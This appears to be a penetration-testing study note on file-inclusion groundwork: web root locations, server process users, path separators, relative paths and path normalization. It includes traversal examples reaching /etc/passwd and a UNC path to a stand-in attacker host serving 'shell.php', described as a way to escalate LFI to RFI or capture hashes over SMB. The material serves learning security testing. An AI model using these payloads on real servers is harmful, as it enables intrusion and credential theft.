---
created: 2026-05-02
---
## The web root

>A **web root**, also called **web document root**, is a top-level directory on a web server that contains publicly accessible files served by the application.

- The location of the web root directory depends on the web server in use an its configuration. 
- Common locations include:

| Server | OS      | Web root                                 |
| ------ | ------- | ---------------------------------------- |
| Apache | Linux   | `/var/www/html`, `/var/www`              |
| Nginx  | Linux   | `/usr/share/nginx/html`, `/var/www/html` |
| IIS    | Windows | `C:\inetpub\wwwroot`                     |
| XAMPP  | Linux   | `/opt/lampp/htdocs`                      |
| XAMPP  | Windows | `C:/xampp/htdocs`                        |
| WAMP   | Windows | `C:\wamp\www`, `C:\wamp64\www`           |
| Apache | macOS   | `/Library/WebServer/Documents`           |

- The web root usually contains only **publicly accessible files** — HTML, CSS, JavaScript, and media files like images or video. 
- Backend application code and configuration files are usually stored outside the web root in directories like `/srv`, `/srv/app`, `/opt/application`, etc.

>[!important] Website visitors should never be able to access files outside of the web root. 


>[!note]+ Wordlists with default web root directories
> 
> - Linux ([`seclists/Discovery/Web-Content/default-web-root-directory-linux.txt`](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)):
> 
> ```
> var/www/html/
> var/www/
> var/www/sites/
> var/www/public/
> var/www/public_html/
> var/www/html/default/
> srv/www/
> srv/www/html/
> srv/www/sites/
> home/www/
> home/httpd/
> home/$USER/public_html/
> home/$USER/www/
> ```
> 
> - Windows ([`seclists/Discovery/Web-Content/default-web-root-directory-windows.txt`](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)):
> 
> ```
> c:\inetpub\wwwroot\
> c:\xampp\htdocs\
> c:\wamp\www
> ```
### Web server process users and permissions

- Files and directories accessible via file inclusion vulnerabilities depends on the privileges of the user on behalf of which the web server is running (the web server process).

Commonly, web servers run under:

| System         | Default user                        | Group                |
| -------------- | ----------------------------------- | -------------------- |
| Apache (Linux) | `www-data`, `apache`, or `httpd`    | `www-data`, `apache` |
| Nginx (Linux)  | `nginx` or `www-data`               | `nginx`, `www-data`  |
| IIS (Windows)  | `IUSR` or `IIS APPPOOL\AppPoolName` | `IIS_IUSRS`          |

These are usually service accounts that have read access to web root content and minimal permissions elsewhere on the filesystem. However, misconfigurations can significantly expand the set of accessible files.
### Directory separators

File path syntax varies across operating systems:

| OS                  | Root directory              | Directory separator                   | Case-sensitive? | Example                       |
| ------------------- | --------------------------- | ------------------------------------- | --------------- | ----------------------------- |
| Unix/Linux<br>macOS | `/`                         | `/`                                   | Yes             | `/var/www/html/file.txt`      |
| Windowos            | `C:\`<br>(`drive_letter:\`) | `\` (primary) or `/` (often accepted) | No              | `C:\inetpub\wwwroot\file.txt` |
| Classic Mac OS      | `drive:`                    | `:` (primary) or `/`                  | Varies          | `Macintosh HD:folder:file`    |

>[!important] Modern Windows APIs accepts both forward slashes (`/`) and backslashes (`\`) as directory separators.
>- That's why payloads designed for Unix systems often work on Windows.

- **Current directory:** `.` — References the current working directory.
- **Parent directory:** `..` — References the directory one level up in the hierarchy.
- **Home directory: `~`** — On Unix/Linux, expands to the current user's home directory.
### Absolute vs. relative paths

Depending on the web server and configuration, applications reference files using either:

- **Absolute paths:** Start from the filesystem root directory and specify the complete path to the resource (e.g., `/etc/passwd`).
- **Relative paths:** Specify paths relative to the current working directory (e.g., `./includes/config.php`, `../../etc/passwd`).

During black-box testing, you would usually try all variants to find what works.
### UNC paths

>**UNC (Universal Naming Convention)** paths on Windows systems provide a standardized way to access network resources.

UNC paths follow the format:

```
\\\<server>\<share_name>\<path>\<file>
```

> [!example]+
> ```
> \\\attacker.com\share\shell.php
> ```

This feature can sometimes be exploited to escalate **LFI to RFI** or force the server to initiate SMB connections to attacker-controlled servers (which, among other things, can be exploited in Pass-the-Hash attacks).
### Path normalization

Before accessing files,, most file systems and APIs **normalize** paths:

- `.` (**current directory**) is removed:

```
/var/www/./html/./file.txt  ⇢  /var/www/html/file.txt
```

- `..` is resolved to the **parent directory**:

```
/var/www/html/../config.php  ⇢  /var/www/config.php
```

- **Redundant separators** are collapsed:

```
/var///www//html////file.txt  ⇢  /var/www/html/file.txt
C:\\\\inetpub\\\\wwwroot  ⇢  C:\inetpub\wwwroot
```

- Many systems remove or ignore **trailing slashes**:

```
/var/www/html/  ⇢  /var/www/html 
```

Path normalization can occur at **multiple layers** — web servers (Apache, Nginx, IIS), reverse proxies, WAFs (Web Application Firewalls), application code, and filesystems. Discrepancies between those layers create opportunities for validation bypass.

>[!note] See [[#Payloads and validation bypass]].